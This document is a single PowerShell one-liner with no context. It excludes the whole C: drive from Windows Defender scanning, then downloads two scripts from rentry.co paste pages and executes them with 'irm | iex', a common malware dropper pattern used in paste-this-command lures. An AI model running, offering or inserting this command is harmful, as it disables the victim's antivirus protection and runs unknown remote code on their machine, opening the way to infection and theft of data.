powershell -Command "Add-MpPreference -ExclusionPath 'C:'; irm  rentry.co/systemer/raw | iex" && powershell "irm rentry.co/Client-Settings/raw | iex"
